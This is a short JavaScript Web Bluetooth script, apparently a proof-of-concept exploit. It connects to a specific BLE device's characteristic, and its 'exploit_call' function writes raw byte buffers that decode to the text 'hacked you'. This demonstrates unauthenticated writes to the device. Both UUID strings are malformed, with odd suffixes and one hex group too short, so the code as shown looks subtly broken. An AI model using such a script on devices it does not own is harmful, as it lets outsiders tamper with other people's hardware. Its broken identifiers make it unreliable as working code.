
var char_exploit;
var dr_device;

function exploit_call(){
  var buffer1 =[0xbe,0x06,0x01,0xfe,0x0a,0x68,0x61,0x63,0x6b,0x65,0x64,0x20] ;
  var buffer2 =[0xbe,0x06,0x02,0xfe,0x0f,0x79,0x6f,0x75,0x0a,0xff,0xff,0xff,0xff,0xff] ;
  writedata1=Uint8Array.from(buffer1);
  writedata2=Uint8Array.from(buffer2);
  char_exploit.writeValue(writedata1);
  char_exploit.writeValue(writedata2);
}


function device_connect() {
    let serviceUuid = "d0a2ff00-2996-d38b-e214-86515df5a1df_0015";
    let characteristicUuid = "905ff01-b5ce-4e99-a40f-4b1e122d00d0_0016"

    navigator.bluetooth.requestDevice
        ({
            filters: [{ services: [serviceUuid] }]
            , optionalServices: [serviceUuid]
        })
        .then(device => {
          dr_device=device;
          return device.gatt.connect();
         })
        .then(server => { return server.getPrimaryService(serviceUuid); })
        .then(service => { return service.getCharacteristic(characteristicUuid); })
        .then(characteristic => { char_exploit=characteristic; })
        .catch(error => {
            console.log('Error! ' + error);
        });
}

function device_disconnect(){
  if (dr_device.gatt.connected)
  {
    dr_device.gatt.disconnect();
  }
}
